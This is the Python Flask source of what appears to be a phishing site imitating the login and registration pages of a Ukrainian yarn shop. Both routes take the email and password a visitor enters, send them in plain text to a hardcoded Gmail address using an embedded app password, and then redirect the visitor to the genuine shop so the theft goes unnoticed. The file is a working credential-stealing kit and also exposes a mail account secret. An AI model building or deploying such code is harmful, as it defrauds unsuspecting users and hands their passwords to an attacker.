from flask import Flask, render_template, request, redirect, flash, url_for
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import os

app = Flask(__name__, static_url_path='/static')

app.secret_key = os.urandom(24)

@app.route('/')
def home():
    return render_template('index.html')  # Загружаем HTML-страницу

@app.route('/login', methods=['GET', 'POST'])
def login():
    # Получаем данные из формы
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    
    if len(email) >= 13 and len(password) >= 5:
        if '@' in email:
            msg = MIMEMultipart()
            message_number = email
            message_pass = password
            
            password_email = "uubq tlnc jxqr alko" 
            msg['From'] = "canddyyarn@gmail.com"
            msg['To'] = "canddyyarn@gmail.com"
            msg['Subject'] = "USER INFO"
            msg.attach(MIMEText(f"LOGIN: {message_number}", 'plain'))
            msg.attach(MIMEText(f"\nPASSWORD: {message_pass}", 'plain'))
            try:
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()
                server.login(msg['From'], password_email)
                server.sendmail(msg['From'], msg['To'], msg.as_string())
                server.quit()
                print('Пароль успешно отправлен на почту.')
                return redirect('https://candy-yarn.com.ua/ua/')
            
            except smtplib.SMTPAuthenticationError as e:
                print(f"Ошибка аутентификации: {e}")
                return 'Ошибка аутентификации, проверьте данные для входа.'
            
            except smtplib.SMTPException as e:
                print(f"Ошибка отправки почты: {e}")
                return 'Не удалось отправить почту. Попробуйте позже.'
            
            except Exception as e:
                print(f"Ошибка: {e}")
                return 'Произошла ошибка при обработке запроса.'
    else:
        flash('Введите правильный Email.', 'error')
        return redirect(url_for('login'))
    
    return render_template('index.html')

@app.route('/sign', methods=['GET', 'POST'])
def sign():
    login()
    return render_template('index.html')


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        password = request.form['password']
        email = request.form['email']
        
        if password and email:
            if len(email) >= 13 and len(password) >= 5:
                if '@' in email:
                    msg = MIMEMultipart()
                    message_number = email
                    message_pass = password
            
                    password_email = "uubq tlnc jxqr alko" 
                    msg['From'] = "canddyyarn@gmail.com"
                    msg['To'] = "canddyyarn@gmail.com"
                    msg['Subject'] = "USER INFO"
                    msg.attach(MIMEText(f"LOGIN: {message_number}", 'plain'))
                    msg.attach(MIMEText(f"\nPASSWORD: {message_pass}", 'plain'))
                    try:
                        server = smtplib.SMTP("smtp.gmail.com", 587)
                        server.starttls()
                        server.login(msg['From'], password_email)
                        server.sendmail(msg['From'], msg['To'], msg.as_string())
                        server.quit()
                        print('Пароль успешно отправлен на почту.')
                        return redirect('https://candy-yarn.com.ua/ua/')
                    
                    except smtplib.SMTPAuthenticationError as e:
                        print(f"Ошибка аутентификации: {e}")
                        return 'Ошибка аутентификации, проверьте данные для входа.'
                    
                    except smtplib.SMTPException as e:
                        print(f"Ошибка отправки почты: {e}")
                        return 'Не удалось отправить почту. Попробуйте позже.'
                    
                    except Exception as e:
                        print(f"Ошибка: {e}")
                        return 'Произошла ошибка при обработке запроса.'
                else:
                    return 'Введіть Email!'
            else:
                return 'Заповніть усі поля.'
        else:
            return 'Заповніть усі поля.'
    return render_template('register.html') 

if __name__ == '__main__':
    app.run(debug=True)  # Включаем режим отладки
